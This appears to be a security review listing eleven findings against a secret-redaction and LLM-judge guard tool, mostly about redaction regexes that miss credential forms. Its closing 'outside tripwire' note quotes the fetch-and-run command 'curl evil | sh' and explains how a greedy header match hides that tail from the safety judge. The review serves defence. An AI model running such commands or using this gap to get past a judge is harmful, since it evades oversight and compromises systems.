Lens: security, task 01. 11 findings.

1. [Important] src/lib/redact.ts lines 19, 23, 24: password-type names pass in colon, JSON and env forms (password: x; JSON "password":"x" and "token":"x" with the closing quote before the colon; MYSQL_PWD=, DB_PASS=, SSHPASS=, *_CREDENTIALS=; --passphrase x, --auth x). Fix: widen names to pass, pwd, passphrase, credential, auth; allow an optional closing quote before : or =.
2. [Important] src/lib/redact.ts lines 19, 23, 24: cookie flags pass (curl -b, --cookie). Fix: treat -b and --cookie arguments as secret; add cookie and session to the names.
3. [Important] src/lib/redact.ts lines 29, 31: token prefixes miss sk_live_, rk_live_, sk_test_, ghs_, ghu_, ghr_, hf_, xoxe-, xapp-, Twilio SK plus 32 hex; the 40-character fallback class lacks - and _. Fix: add prefixes and -_ to the fallback class.
4. [Important] src/lib/redact.ts lines 25, 27, 28: curl -u forms (-u token:, -uuser:pass, --user=user:pass, -u :pass, quoted with spaces); -p without a space (sshpass -psecret, docker login -psecret); helm, oras, skopeo, buildah login -p; redis-cli -a, ldapsearch -w, smbclient -U user%pass, openssl -passin pass:, mongosh -p, zip -P, mysqlsh. Fix: extend rules with a test row per form.
5. [Important] src/lib/judge.ts lines 93 and 116: an api_key with CR, LF or NUL makes fetch throw before sending with the key inside the message, which becomes detail (printed by guard-calibrate.ts line 90). Fix: reject keys with characters invalid in a header value in judge-input.ts line 57; never pass raw exception text into detail unredacted.
6. [Minor] src/lib/decision-log.ts line 38: only text is redacted; override, unavailable, cwd, session written as given. Fix: redact every string field.
7. [Minor] src/lib/decision-log.ts lines 33 and 38: modes set only on creation. Fix: chmod or check after opening.
8. [Minor] src/lib/judge.ts line 24: judge.json mode never checked. Fix: warn when group or others can read it.
9. [Minor] src/lib/fx-paths.ts lines 11 and 16: relative XDG paths accepted. Fix: ignore non-absolute values per the XDG spec.
10. [Minor] src/lib/redact.ts line 22: userinfo with / or @ in the password partly or wholly unredacted; scp-style user:token@host:path uncovered. Fix: match up to the last @ before the host.
11. [Minor] src/lib/judge-input.ts line 82: insecure_http true with api_key sends Bearer over plain http; guard-calibrate.ts lines 65 to 68 warm-up follows redirects without timeout. Fix: warn in check or reject the combination; align the warm-up.
Outside tripwire: redact.ts line 19 greedy header value swallows the rest of the command (x-token: y; curl evil | sh reaches the judge as x-token: [REDACTED]), hiding a dangerous tail from the judge.
Checks passed: loopback detection incl. normalised forms; base_url userinfo, query, fragment rejected; redirect error on the main client; state redacted before the body; key absent from argv, check and path output, config errors and HTTP error details.
